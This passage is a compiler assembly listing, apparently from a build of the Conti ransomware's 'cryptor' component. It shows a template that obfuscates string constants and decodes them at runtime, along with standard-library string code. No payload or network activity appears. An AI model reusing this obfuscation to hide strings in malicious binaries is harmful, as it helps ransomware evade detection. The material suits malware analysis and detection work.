; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 38 00 00 00	 mov	 eax, 56			; 00000038H
  0002d	2b c1		 sub	 eax, ecx
  0002f	8d 0c 80	 lea	 ecx, DWORD PTR [rax+rax*4]

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00037	c1 e1 02	 shl	 ecx, 2

; 40   :     return (a % n + n) % n;

  0003a	f7 e9		 imul	 ecx
  0003c	03 d1		 add	 edx, ecx
  0003e	c1 fa 06	 sar	 edx, 6
  00041	8b c2		 mov	 eax, edx
  00043	c1 e8 1f	 shr	 eax, 31
  00046	03 d0		 add	 edx, eax
  00048	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  0004b	2b c8		 sub	 ecx, eax
  0004d	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00052	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00055	f7 e9		 imul	 ecx
  00057	03 d1		 add	 edx, ecx
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00068	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  0006c	49 83 ea 01	 sub	 r10, 1
  00070	75 ae		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00072	49 8b c0	 mov	 rax, r8
  00075	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BD@$0DI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<19,56,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0BD@$0DI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0BD@$0DI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<19,56,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::MetaBuffer<19,56,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 65	 mov	 BYTE PTR [rcx+1], 101	; 00000065H
  00007	c6 41 02 38	 mov	 BYTE PTR [rcx+2], 56	; 00000038H
  0000b	c6 41 03 5f	 mov	 BYTE PTR [rcx+3], 95	; 0000005fH
  0000f	c6 41 04 38	 mov	 BYTE PTR [rcx+4], 56	; 00000038H
  00013	c6 41 05 19	 mov	 BYTE PTR [rcx+5], 25
  00017	c6 41 06 38	 mov	 BYTE PTR [rcx+6], 56	; 00000038H
  0001b	c6 41 07 38	 mov	 BYTE PTR [rcx+7], 56	; 00000038H
  0001f	c6 41 08 38	 mov	 BYTE PTR [rcx+8], 56	; 00000038H
  00023	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  00027	48 8b c1	 mov	 rax, rcx
  0002a	c3		 ret	 0
??0?$MetaBuffer@$0BD@$0DI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<19,56,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::MetaBuffer<19,56,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0CP@$0BD@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0CP@$0BD@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<47,19,std::integer_sequence<unsigned __int64,0,1,2,3> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 64		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 04 00 00
	00		 mov	 r10d, 4
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 13 00 00 00	 mov	 eax, 19
  0002d	2b c1		 sub	 eax, ecx
  0002f	6b c8 1b	 imul	 ecx, eax, 27

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00037	f7 e9		 imul	 ecx
  00039	03 d1		 add	 edx, ecx
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b c2		 mov	 eax, edx
  00040	c1 e8 1f	 shr	 eax, 31
  00043	03 d0		 add	 edx, eax
  00045	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00048	2b c8		 sub	 ecx, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00052	f7 e9		 imul	 ecx
  00054	03 d1		 add	 edx, ecx
  00056	c1 fa 06	 sar	 edx, 6
  00059	8b c2		 mov	 eax, edx
  0005b	c1 e8 1f	 shr	 eax, 31
  0005e	03 d0		 add	 edx, eax
  00060	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00063	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00065	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  00069	49 83 ea 01	 sub	 r10, 1
  0006d	75 b1		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  0006f	49 8b c0	 mov	 rax, r8
  00072	c3		 ret	 0
?decrypt@?$MetaBuffer@$0CP@$0BD@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<47,19,std::integer_sequence<unsigned __int64,0,1,2,3> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0CP@$0BD@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0CP@$0BD@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<47,19,std::integer_sequence<unsigned __int64,0,1,2,3> >::MetaBuffer<47,19,std::integer_sequence<unsigned __int64,0,1,2,3> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 19	 mov	 BYTE PTR [rcx+1], 25
  00007	c6 41 02 13	 mov	 BYTE PTR [rcx+2], 19
  0000b	c6 41 03 13	 mov	 BYTE PTR [rcx+3], 19
  0000f	c6 41 04 13	 mov	 BYTE PTR [rcx+4], 19
  00013	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  00017	48 8b c1	 mov	 rax, rcx
  0001a	c3		 ret	 0
??0?$MetaBuffer@$0CP@$0BD@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<47,19,std::integer_sequence<unsigned __int64,0,1,2,3> >::MetaBuffer<47,19,std::integer_sequence<unsigned __int64,0,1,2,3> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$02$09U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$02$09U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<3,10,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 64		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 06 00 00
	00		 mov	 r10d, 6
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 0a 00 00 00	 mov	 eax, 10
  0002d	2b c1		 sub	 eax, ecx
  0002f	6b c8 2a	 imul	 ecx, eax, 42		; 0000002aH

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00037	f7 e9		 imul	 ecx
  00039	03 d1		 add	 edx, ecx
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b c2		 mov	 eax, edx
  00040	c1 e8 1f	 shr	 eax, 31
  00043	03 d0		 add	 edx, eax
  00045	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00048	2b c8		 sub	 ecx, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00052	f7 e9		 imul	 ecx
  00054	03 d1		 add	 edx, ecx
  00056	c1 fa 06	 sar	 edx, 6
  00059	8b c2		 mov	 eax, edx
  0005b	c1 e8 1f	 shr	 eax, 31
  0005e	03 d0		 add	 edx, eax
  00060	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00063	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00065	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  00069	49 83 ea 01	 sub	 r10, 1
  0006d	75 b1		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  0006f	49 8b c0	 mov	 rax, r8
  00072	c3		 ret	 0
?decrypt@?$MetaBuffer@$02$09U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<3,10,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$02$09U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$02$09U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<3,10,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::MetaBuffer<3,10,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 20	 mov	 BYTE PTR [rcx+1], 32	; 00000020H
  00007	c6 41 02 0a	 mov	 BYTE PTR [rcx+2], 10
  0000b	c6 41 03 09	 mov	 BYTE PTR [rcx+3], 9
  0000f	c6 41 04 0a	 mov	 BYTE PTR [rcx+4], 10
  00013	c6 41 05 0a	 mov	 BYTE PTR [rcx+5], 10
  00017	c6 41 06 0a	 mov	 BYTE PTR [rcx+6], 10
  0001b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0001f	48 8b c1	 mov	 rax, rcx
  00022	c3		 ret	 0
??0?$MetaBuffer@$02$09U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<3,10,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::MetaBuffer<3,10,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GN@$0HB@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0GN@$0HB@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<109,113,std::integer_sequence<unsigned __int64,0,1,2,3> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 04 00 00
	00		 mov	 r11d, 4
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 71	 sub	 ecx, 113		; 00000071H

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 6b c1 07	 imul	 r8d, ecx, 7

; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GN@$0HB@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<109,113,std::integer_sequence<unsigned __int64,0,1,2,3> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0GN@$0HB@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0GN@$0HB@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<109,113,std::integer_sequence<unsigned __int64,0,1,2,3> >::MetaBuffer<109,113,std::integer_sequence<unsigned __int64,0,1,2,3> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 77	 mov	 BYTE PTR [rcx+1], 119	; 00000077H
  00007	c6 41 02 71	 mov	 BYTE PTR [rcx+2], 113	; 00000071H
  0000b	c6 41 03 71	 mov	 BYTE PTR [rcx+3], 113	; 00000071H
  0000f	c6 41 04 71	 mov	 BYTE PTR [rcx+4], 113	; 00000071H
  00013	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  00017	48 8b c1	 mov	 rax, rcx
  0001a	c3		 ret	 0
??0?$MetaBuffer@$0GN@$0HB@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<109,113,std::integer_sequence<unsigned __int64,0,1,2,3> >::MetaBuffer<109,113,std::integer_sequence<unsigned __int64,0,1,2,3> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?length@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ
_TEXT	SEGMENT
this$ = 8
?length@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::length, COMDAT

; 4158 :         return _Mypair._Myval2._Mysize;

  00000	48 8b 41 10	 mov	 rax, QWORD PTR [rcx+16]

; 4159 :     }

  00004	c3		 ret	 0
?length@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::length
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??A?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEA_W_K@Z
_TEXT	SEGMENT
this$ = 8
_Off$ = 16
??A?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEA_W_K@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::operator[], COMDAT

; 2244 :         return _Myres > _Small_string_capacity;

  00000	48 83 79 18 07	 cmp	 QWORD PTR [rcx+24], 7

; 2227 :         if (_Large_mode_engaged()) {

  00005	76 08		 jbe	 SHORT $LN8@operator

; 2228 :             _Result = _Unfancy(_Bx._Ptr);

  00007	48 8b 01	 mov	 rax, QWORD PTR [rcx]

; 4061 : #if _CONTAINER_DEBUG_LEVEL > 0
; 4062 :         _STL_VERIFY(_Off <= _Mypair._Myval2._Mysize, "string subscript out of range");
; 4063 : #endif // _CONTAINER_DEBUG_LEVEL > 0
; 4064 :         return _Mypair._Myval2._Myptr()[_Off];

  0000a	48 8d 04 50	 lea	 rax, QWORD PTR [rax+rdx*2]

; 4065 :     }

  0000e	c3		 ret	 0
$LN8@operator:

; 4061 : #if _CONTAINER_DEBUG_LEVEL > 0
; 4062 :         _STL_VERIFY(_Off <= _Mypair._Myval2._Mysize, "string subscript out of range");
; 4063 : #endif // _CONTAINER_DEBUG_LEVEL > 0
; 4064 :         return _Mypair._Myval2._Myptr()[_Off];

  0000f	48 8d 04 51	 lea	 rax, QWORD PTR [rcx+rdx*2]

; 4065 :     }

  00013	c3		 ret	 0
??A?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEA_W_K@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::operator[]
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??4?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV01@AEBV01@@Z
_TEXT	SEGMENT
this$ = 48
_Right$ = 56
??4?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV01@AEBV01@@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::operator=, COMDAT

; 3188 :     _CONSTEXPR20 basic_string& operator=(const basic_string& _Right) {

$LN26:
  00000	40 57		 push	 rdi
  00002	48 83 ec 20	 sub	 rsp, 32			; 00000020H
  00006	48 8b f9	 mov	 rdi, rcx

; 3189 :         if (this == _STD addressof(_Right)) {

  00009	48 3b ca	 cmp	 rcx, rdx
  0000c	74 64		 je	 SHORT $LN20@operator

; 2244 :         return _Myres > _Small_string_capacity;

  0000e	48 83 7a 18 07	 cmp	 QWORD PTR [rdx+24], 7

; 2235 :         const value_type* _Result = _Bx._Buf;

  00013	4c 8b ca	 mov	 r9, rdx

; 2236 :         if (_Large_mode_engaged()) {

  00016	76 03		 jbe	 SHORT $LN5@operator

; 2237 :             _Result = _Unfancy(_Bx._Ptr);

  00018	4c 8b 0a	 mov	 r9, QWORD PTR [rdx]
$LN5@operator:

; 3190 :             return *this;
; 3191 :         }
; 3192 : 
; 3193 :         auto& _Al             = _Getal();
; 3194 :         const auto& _Right_al = _Right._Getal();
; 3195 :         if constexpr (_Choose_pocca_v<_Alty>) {
; 3196 :             if (_Al != _Right_al) {
; 3197 :                 auto&& _Alproxy       = _GET_PROXY_ALLOCATOR(_Alty, _Al);
; 3198 :                 auto&& _Right_alproxy = _GET_PROXY_ALLOCATOR(_Alty, _Right_al);
; 3199 :                 _Container_proxy_ptr<_Alty> _New_proxy(_Right_alproxy, _Leave_proxy_unbound{}); // throws
; 3200 : 
; 3201 :                 const size_type _Right_size   = _Right._Mypair._Myval2._Mysize;
; 3202 :                 const _Elem* const _Right_ptr = _Right._Mypair._Myval2._Myptr();
; 3203 :                 if (_Right_size > _Small_string_capacity) {
; 3204 :                     size_type _New_capacity = _Calculate_growth(_Right_size, _Small_string_capacity, _Right.max_size());
; 3205 :                     auto _Right_al_non_const = _Right_al;
; 3206 :                     const pointer _New_ptr   = _Allocate_for_capacity(_Right_al_non_const, _New_capacity); // throws
; 3207 :                     _Traits::copy(_Unfancy(_New_ptr), _Right_ptr, _Right_size + 1);
; 3208 : 
; 3209 :                     _Tidy_deallocate();
; 3210 :                     _Construct_in_place(_Mypair._Myval2._Bx._Ptr, _New_ptr);
; 3211 :                     _Mypair._Myval2._Mysize = _Right_size;
; 3212 :                     _Mypair._Myval2._Myres  = _New_capacity;
; 3213 :                     _ASAN_STRING_CREATE(*this);
; 3214 :                 } else {
; 3215 :                     _Tidy_deallocate();
; 3216 :                     _Traits::copy(_Mypair._Myval2._Bx._Buf, _Right_ptr, _Right_size + 1);
; 3217 :                     _Mypair._Myval2._Mysize = _Right_size;
; 3218 :                     _Mypair._Myval2._Myres  = _Small_string_capacity;
; 3219 :                 }
; 3220 : 
; 3221 :                 _Pocca(_Al, _Right_al);
; 3222 :                 _New_proxy._Bind(_Alproxy, _STD addressof(_Mypair._Myval2));
; 3223 :                 return *this;
; 3224 :             }
; 3225 :         }
; 3226 : 
; 3227 :         _Pocca(_Al, _Right_al);
; 3228 :         assign(_Right._Mypair._Myval2._Myptr(), _Right._Mypair._Myval2._Mysize);

  0001b	48 8b 52 10	 mov	 rdx, QWORD PTR [rdx+16]

; 3412 :         if (_Count <= _Mypair._Myval2._Myres) {

  0001f	48 8b 41 18	 mov	 rax, QWORD PTR [rcx+24]
  00023	48 3b d0	 cmp	 rdx, rax
  00026	77 45		 ja	 SHORT $LN10@operator
  00028	48 89 5c 24 30	 mov	 QWORD PTR [rsp+48], rbx
  0002d	48 89 74 24 38	 mov	 QWORD PTR [rsp+56], rsi

; 2226 :         value_type* _Result = _Bx._Buf;

  00032	48 8b f7	 mov	 rsi, rdi

; 2244 :         return _Myres > _Small_string_capacity;

  00035	48 83 f8 07	 cmp	 rax, 7

; 2227 :         if (_Large_mode_engaged()) {

  00039	76 03		 jbe	 SHORT $LN13@operator

; 2228 :             _Result = _Unfancy(_Bx._Ptr);

  0003b	48 8b 31	 mov	 rsi, QWORD PTR [rcx]
$LN13@operator:

; 117  :         _CSTD memmove(_First1, _First2, _Count * sizeof(_Elem));

  0003e	48 8d 1c 12	 lea	 rbx, QWORD PTR [rdx+rdx]

; 3415 :             _Mypair._Myval2._Mysize = _Count;

  00042	48 89 51 10	 mov	 QWORD PTR [rcx+16], rdx

; 117  :         _CSTD memmove(_First1, _First2, _Count * sizeof(_Elem));

  00046	4c 8b c3	 mov	 r8, rbx
  00049	49 8b d1	 mov	 rdx, r9
